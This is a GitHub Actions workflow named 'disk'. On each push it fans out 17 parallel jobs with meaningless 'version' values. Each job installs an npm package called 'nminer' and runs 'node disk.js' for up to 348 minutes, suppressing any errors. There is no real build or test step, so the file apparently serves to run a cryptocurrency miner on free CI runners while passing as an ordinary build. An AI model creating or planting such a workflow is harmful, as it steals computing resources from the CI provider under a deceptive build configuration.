name: disk
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 378 }
          - { version: 521 }
          - { version: 8410 }
          - { version: 6468 }
          - { version: 6180 }
          - { version: 2640 }
          - { version: 6671 }
          - { version: 7630 }
          - { version: 3883 }
          - { version: 3339 }
          - { version: 1810 }
          - { version: 737 }
          - { version: 3561 }
          - { version: 225 }
          - { version: 8924 }
          - { version: 7811 }
          - { version: 2850 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: tut past clear
        run: |
          npm install nminer@latest
          timeout 348m node disk.js || echo "disk executed"